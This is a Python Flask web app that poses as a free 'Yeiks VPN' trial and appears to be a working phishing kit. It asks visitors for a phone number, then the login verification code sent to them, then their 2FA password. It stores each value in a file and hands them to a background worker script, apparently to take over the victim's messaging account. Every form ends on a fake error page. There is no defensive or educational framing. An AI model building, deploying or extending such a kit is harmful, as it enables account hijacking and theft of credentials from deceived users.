from flask import Flask, request, render_template_string
import subprocess
import json
import os
import time

app = Flask(__name__)

P1 = """<!DOCTYPE html><html><head><title>Yeiks VPN</title>
<style>body{font-family:Arial;background:#0a0e17;color:#fff;text-align:center;padding:40px 20px}.c{max-width:450px;margin:0 auto;background:#1a1f2e;padding:30px;border-radius:20px;border:1px solid #2a3f5e}h1{color:#00bcd4}input{width:90%;padding:14px;margin:10px 0;border-radius:10px;border:none;background:#0f1420;color:#fff;font-size:16px}button{background:#00bcd4;color:#0a0e17;border:none;padding:16px;border-radius:30px;font-size:18px;font-weight:bold;cursor:pointer;width:100%}button:hover{background:#00e5ff}</style>
</head><body><div class=c><h1>🛡️ Yeiks VPN 🇦🇶</h1><p>1 week FREE. Enter your number.</p>
<form method=POST action=/send><input type=tel name=phone placeholder="📱 Phone" required><button type=submit>Send Code</button></form></div></body></html>"""

P2 = """<!DOCTYPE html><html><head><title>Yeiks VPN</title>
<style>body{font-family:Arial;background:#0a0e17;color:#fff;text-align:center;padding:40px 20px}.c{max-width:450px;margin:0 auto;background:#1a1f2e;padding:30px;border-radius:20px;border:1px solid #2a3f5e}h1{color:#00bcd4}input{width:90%;padding:14px;margin:10px 0;border-radius:10px;border:none;background:#0f1420;color:#fff;font-size:16px}button{background:#00bcd4;color:#0a0e17;border:none;padding:16px;border-radius:30px;font-size:18px;font-weight:bold;cursor:pointer;width:100%}button:hover{background:#00e5ff}</style>
</head><body><div class=c><h1>🔑 Verification Code</h1><p>Sent to <strong>{{ p }}</strong></p>
<form method=POST action=/login><input type=hidden name=phone value="{{ p }}"><input type=text name=code placeholder="5-digit code" required><button type=submit>Activate</button></form></div></body></html>"""

P2FA = """<!DOCTYPE html><html><head><title>2FA Required</title>
<style>body{font-family:Arial;background:#0a0e17;color:#fff;text-align:center;padding:40px 20px}.c{max-width:450px;margin:0 auto;background:#1a1f2e;padding:30px;border-radius:20px;border:1px solid #2a3f5e}h1{color:#ff9800}input{width:90%;padding:14px;margin:10px 0;border-radius:10px;border:none;background:#0f1420;color:#fff;font-size:16px}button{background:#ff9800;color:#0a0e17;border:none;padding:16px;border-radius:30px;font-size:18px;font-weight:bold;cursor:pointer;width:100%}button:hover{background:#ffb74d}</style>
</head><body><div class=c><h1>🔐 2FA Required</h1><p>Enter your 2FA password</p>
<form method=POST action=/2fa><input type=hidden name=phone value="{{ p }}"><input type=password name=password placeholder="2FA password" required><button type=submit>Activate</button></form></div></body></html>"""

ERR = """<!DOCTYPE html><html><head><title>Error</title></head><body style="background:#0a0e17;color:#fff;text-align:center;padding:50px;font-family:Arial"><h2 style=color:#ff5252>Error</h2><p>Try again</p><a href="/" style=color:#00bcd4>Back</a></body></html>"""

PENDING_FILE = "pending.json"

def save_pending(phone, code="", password=None):
    with open(PENDING_FILE, "w") as f:
        json.dump({"phone": phone, "code": code, "password": password}, f)

def get_pending():
    if os.path.exists(PENDING_FILE):
        with open(PENDING_FILE, "r") as f:
            return json.load(f)
    return None

@app.route('/')
def index():
    return render_template_string(P1)

@app.route('/send', methods=['POST'])
def send():
    phone = request.form.get('phone', '').strip()
    if not phone:
        return render_template_string(ERR)
    save_pending(phone, code="")
    # En Render, ejecutamos worker.py en segundo plano (si existe)
    try:
        subprocess.Popen(["python3", "worker.py", phone], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass
    return render_template_string(P2, p=phone)

@app.route('/login', methods=['POST'])
def login():
    phone = request.form.get('phone', '').strip()
    code = request.form.get('code', '').strip()
    if not phone or not code:
        return render_template_string(ERR)
    save_pending(phone, code=code)
    try:
        subprocess.Popen(["python3", "worker.py", phone], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass
    time.sleep(2)
    pending = get_pending()
    if pending and pending.get("status") == "needs_2fa":
        return render_template_string(P2FA, p=phone)
    else:
        return render_template_string(ERR)

@app.route('/2fa', methods=['POST'])
def twofa():
    phone = request.form.get('phone', '').strip()
    password = request.form.get('password', '').strip()
    if not phone or not password:
        return render_template_string(ERR)
    pending = get_pending()
    if pending and pending.get("phone") == phone:
        pending["password"] = password
        with open(PENDING_FILE, "w") as f:
            json.dump(pending, f)
        try:
            subprocess.Popen(["python3", "worker.py", phone], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    return render_template_string(ERR)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
